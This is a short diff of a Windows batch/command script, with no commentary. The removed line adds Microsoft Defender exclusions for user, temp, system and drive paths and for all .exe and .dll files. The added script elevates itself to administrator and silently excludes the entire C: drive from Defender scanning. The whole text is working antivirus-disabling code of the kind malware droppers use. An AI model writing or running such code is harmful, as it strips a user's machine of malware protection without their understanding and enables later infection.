@@ -1,1 +1,4 @@
-C:\Windows\System32\cmd.exe cmd /c powershell -Command Add-MpPreference -ExclusionPath @(($pwd).path, $env:UserProfile,$env:AppData,$env:Temp,$env:SystemRoot,$env:HomeDrive,$env:SystemDrive) -Force & powershell -Command Add-MpPreference -ExclusionExtension @('exe','dll') -Force & exit
+@echo off 
+net session >NUL 2>&1|| powershell Start-Process '%0' -Verb RunAs&& exit /b|| exit /b 
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath 'C:' 
+exit
